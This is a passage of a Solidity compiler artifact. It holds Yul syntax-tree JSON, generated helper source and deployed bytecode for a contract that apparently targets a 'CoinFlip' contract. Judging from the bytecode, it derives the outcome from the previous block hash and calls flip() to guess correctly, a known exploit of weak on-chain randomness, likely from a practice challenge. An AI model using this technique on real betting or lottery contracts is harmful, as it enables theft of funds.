														"nodeType": "YulTypedName",
														"src": "820:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nodeType": "YulTypedName",
														"src": "830:9:3",
														"type": ""
													}
												],
												"src": "780:126:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "987:66:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "997:50:3",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1041:5:3"
																	}
																],
																"functionName": {
																	"name": "convert_t_uint160_to_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "1010:30:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1010:37:3"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nodeType": "YulIdentifier",
																	"src": "997:9:3"
																}
															]
														}
													]
												},
												"name": "convert_t_contract$_CoinFlip_$87_to_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "967:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nodeType": "YulTypedName",
														"src": "977:9:3",
														"type": ""
													}
												],
												"src": "912:141:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1139:81:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1156:3:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1207:5:3"
																			}
																		],
																		"functionName": {
																			"name": "convert_t_contract$_CoinFlip_$87_to_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "1161:45:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1161:52:3"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1149:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1149:65:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1149:65:3"
														}
													]
												},
												"name": "abi_encode_t_contract$_CoinFlip_$87_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1127:5:3",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1134:3:3",
														"type": ""
													}
												],
												"src": "1059:161:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1339:139:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1349:26:3",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1361:9:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1372:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1357:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1357:18:3"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1349:4:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1444:6:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1457:9:3"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1468:1:3",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1453:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1453:17:3"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_contract$_CoinFlip_$87_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1385:58:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1385:86:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1385:86:3"
														}
													]
												},
												"name": "abi_encode_tuple_t_contract$_CoinFlip_$87__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1311:9:3",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1323:6:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1334:4:3",
														"type": ""
													}
												],
												"src": "1226:252:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1529:32:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1539:16:3",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1550:5:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1539:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1511:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1521:7:3",
														"type": ""
													}
												],
												"src": "1484:77:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1595:152:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1612:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1615:77:3",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1605:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1605:88:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1605:88:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1709:1:3",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1712:4:3",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1702:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1702:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1702:15:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1733:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1736:4:3",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1726:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1726:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1726:15:3"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "1567:180:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1798:146:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1808:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1831:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1813:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1813:20:3"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1808:1:3"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1842:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1865:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1847:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1847:20:3"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1842:1:3"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1889:22:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1891:16:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1891:18:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1891:18:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1883:1:3"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1886:1:3"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "1880:2:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1880:8:3"
															},
															"nodeType": "YulIf",
															"src": "1877:34:3"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1921:17:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1933:1:3"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1936:1:3"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "1929:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1929:9:3"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "1921:4:3"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1784:1:3",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1787:1:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "1793:4:3",
														"type": ""
													}
												],
												"src": "1753:191:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1978:152:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1995:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1998:77:3",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1988:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1988:88:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1988:88:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2092:1:3",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2095:4:3",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2085:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2085:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2085:15:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2116:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2119:4:3",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2109:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2109:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2109:15:3"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "1950:180:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2178:143:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2188:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2211:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2193:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2193:20:3"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "2188:1:3"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2222:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2245:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2227:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2227:20:3"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "2222:1:3"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2269:22:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "2271:16:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2271:18:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2271:18:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2266:1:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2259:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2259:9:3"
															},
															"nodeType": "YulIf",
															"src": "2256:35:3"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2301:14:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2310:1:3"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2313:1:3"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "2306:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2306:9:3"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "2301:1:3"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "2167:1:3",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "2170:1:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "2176:1:3",
														"type": ""
													}
												],
												"src": "2136:185:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2367:35:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2377:19:3",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2393:2:3",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "2387:5:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2387:9:3"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "2377:6:3"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "2360:6:3",
														"type": ""
													}
												],
												"src": "2327:75:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2497:28:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2514:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2517:1:3",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2507:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2507:12:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2507:12:3"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "2408:117:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2620:28:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2637:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2640:1:3",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2630:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2630:12:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2630:12:3"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "2531:117:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2694:76:3",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2748:16:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2757:1:3",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2760:1:3",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2750:6:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2750:12:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2750:12:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2717:5:3"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "2739:5:3"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "2724:14:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2724:21:3"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "2714:2:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2714:32:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2707:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2707:40:3"
															},
															"nodeType": "YulIf",
															"src": "2704:60:3"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2687:5:3",
														"type": ""
													}
												],
												"src": "2654:116:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2836:77:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2846:22:3",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "2861:6:3"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "2855:5:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2855:13:3"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "2846:5:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2901:5:3"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "2877:23:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2877:30:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2877:30:3"
														}
													]
												},
												"name": "abi_decode_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "2814:6:3",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "2822:3:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2830:5:3",
														"type": ""
													}
												],
												"src": "2776:137:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2993:271:3",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "3039:83:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "3041:77:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3041:79:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "3041:79:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "3014:7:3"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "3023:9:3"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "3010:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3010:23:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3035:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "3006:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "3006:32:3"
															},
															"nodeType": "YulIf",
															"src": "3003:119:3"
														},
														{
															"nodeType": "YulBlock",
															"src": "3132:125:3",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "3147:15:3",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3161:1:3",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "3151:6:3",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "3176:71:3",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "3219:9:3"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "3230:6:3"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "3215:3:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "3215:22:3"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "3239:7:3"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "3186:28:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3186:61:3"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "3176:6:3"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "2963:9:3",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "2974:7:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "2986:6:3",
														"type": ""
													}
												],
												"src": "2919:345:3"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function identity(value) -> ret {\n        ret := value\n    }\n\n    function convert_t_uint160_to_t_uint160(value) -> converted {\n        converted := cleanup_t_uint160(identity(cleanup_t_uint160(value)))\n    }\n\n    function convert_t_uint160_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_uint160(value)\n    }\n\n    function convert_t_contract$_CoinFlip_$87_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_address(value)\n    }\n\n    function abi_encode_t_contract$_CoinFlip_$87_to_t_address_fromStack(value, pos) {\n        mstore(pos, convert_t_contract$_CoinFlip_$87_to_t_address(value))\n    }\n\n    function abi_encode_tuple_t_contract$_CoinFlip_$87__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_contract$_CoinFlip_$87_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 3,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c8063cde4efa91461003b578063f32d251d14610059575b600080fd5b610043610077565b6040516100509190610197565b60405180910390f35b610061610158565b60405161006e9190610231565b60405180910390f35b6000806001436100879190610285565b4060001c905060006001548261009d91906102e8565b90506000600182146100b05760006100b3565b60015b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b815260040161010e9190610197565b6020604051808303816000875af115801561012d573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610151919061034a565b5050505090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008115159050919050565b6101918161017c565b82525050565b60006020820190506101ac6000830184610188565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006101f76101f26101ed846101b2565b6101d2565b6101b2565b9050919050565b6000610209826101dc565b9050919050565b600061021b826101fe565b9050919050565b61022b81610210565b82525050565b60006020820190506102466000830184610222565b92915050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006102908261024c565b915061029b8361024c565b9250828210156102ae576102ad610256565b5b828203905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b60006102f38261024c565b91506102fe8361024c565b92508261030e5761030d6102b9565b5b828204905092915050565b600080fd5b6103278161017c565b811461033257600080fd5b50565b6000815190506103448161031e565b92915050565b6000602082840312156103605761035f610319565b5b600061036e84828501610335565b9150509291505056fea264697066735822122039d2d98d2861fc83dd1aa347fa18de004eef61ad0f0045ac36d173753f00f16c64736f6c634300080f0033",
